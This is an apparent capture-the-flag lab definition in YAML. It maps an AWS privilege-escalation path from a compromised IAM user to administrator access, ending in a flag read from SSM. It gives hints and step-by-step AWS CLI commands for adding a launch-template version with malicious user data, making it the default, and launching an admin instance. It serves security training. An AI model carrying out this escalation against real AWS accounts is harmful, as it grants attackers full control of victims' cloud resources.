attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-ec2-005-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has ec2:CreateLaunchTemplateVersion and ec2:ModifyLaunchTemplate
        permissions, allowing modification of existing EC2 launch templates that
        reference administrative IAM roles.

    - id: launch-template
      label: "EC2 Launch Template"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:launch-template/pl-prod-ec2-005-to-admin-template"
      description: >
        This EC2 launch template already references the administrative IAM role
        (pl-prod-ec2-005-to-admin-target-role) in a previous version. By creating
        a new version with malicious user data and setting it as the default, any
        subsequently launched instance will receive admin permissions and execute
        your payload automatically.

    - id: ec2-instance
      label: "EC2 Instance"
      type: resource
      subType: ec2-instance
      arn: "arn:aws:ec2:{region}:{account_id}:instance/*"
      description: >
        An EC2 instance launched from the modified launch template. It receives the
        administrative instance profile (pl-prod-ec2-005-to-admin-target-role) and
        executes the malicious user data script on startup. The script uses the
        instance's admin credentials to attach AdministratorAccess to the starting user.

    - id: target-role
      label: "Admin Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-ec2-005-to-admin-target-role"
      description: >
        This IAM role has AdministratorAccess and is already referenced in a prior
        version of the launch template. By creating a new template version that
        keeps this role as the instance profile and injects malicious user data,
        any subsequently launched EC2 instance assumes this role on startup and
        executes the payload with full administrative permissions. The attacker gains
        effective admin access by having the instance's user data script attach
        AdministratorAccess to the starting user — admin-equivalent permissions
        that are then used to read the scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/ec2-005-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-user
      to: launch-template
      label: "ec2:CreateLaunchTemplateVersion + ec2:ModifyLaunchTemplate"
      description: >
        Create a new launch template version referencing the existing admin role and
        containing malicious user data. Then set this version as the default.
      hints:
        - "Create a new launch template version that keeps the existing admin instance profile and adds malicious user data (a base64-encoded script calling iam:AttachUserPolicy), then set it as the default with ec2:ModifyLaunchTemplate. No PassRole is needed because the admin role is already referenced in the template."
        - "Browse to https://pathfinding.cloud/paths/ec2-005 for technique details."
      commands:
        - description: "Describe existing launch templates to find the target"
          command: "aws ec2 describe-launch-templates --filters 'Name=tag:Scenario,Values=ec2-005'"
        - description: "View existing template versions to identify the admin role ARN"
          command: "aws ec2 describe-launch-template-versions --launch-template-name pl-prod-ec2-005-to-admin-template"
        - description: "Create a new template version with admin role and malicious user data"
          command: "aws ec2 create-launch-template-version --launch-template-name pl-prod-ec2-005-to-admin-template --version-description 'malicious' --source-version 1 --launch-template-data '{\"IamInstanceProfile\":{\"Name\":\"pl-prod-ec2-005-to-admin-target-role\"},\"UserData\":\"<base64-encoded-script>\"}'"
        - description: "Set the new version as the default"
          command: "aws ec2 modify-launch-template --launch-template-name pl-prod-ec2-005-to-admin-template --default-version 2"

    - from: launch-template
      to: ec2-instance
      label: "ec2:RunInstances"
      description: >
        Launch an EC2 instance using the modified launch template. The instance
        receives the admin instance profile and executes the malicious user data.
      hints:
        - "With the default version updated, launch an instance using ec2:RunInstances with a launch template reference pointing to $Default. If an Auto Scaling Group references this template, you can alternatively trigger a launch by increasing its desired capacity."
      commands:
        - description: "Launch an EC2 instance using the modified template"
          command: "aws ec2 run-instances --launch-template 'LaunchTemplateName=pl-prod-ec2-005-to-admin-template,Version=$Default' --instance-type t3.micro"

    - from: ec2-instance
      to: target-role
      label: "iam:AttachUserPolicy (via user data)"
      description: >
        The instance launches with the admin instance profile (pl-prod-ec2-005-to-admin-target-role)
        and executes the malicious user data script. The script uses the instance's admin credentials
        to attach AdministratorAccess to the starting user, completing the privilege escalation.
      hints:
        - "The instance boots with the admin instance profile and runs your user data script as that role. Wait 2-3 minutes after the instance reaches 'running', then confirm AdministratorAccess was attached via iam:ListAttachedUserPolicies on the starting user."
      commands:
        - description: "Verify admin access after user data executes"
          command: "aws iam list-attached-user-policies --user-name pl-prod-ec2-005-to-admin-starting-user"

    - from: target-role
      to: ctf-flag
      label: "ssm:GetParameter"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter name to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/ec2-005-to-admin --query 'Parameter.Value' --output text"
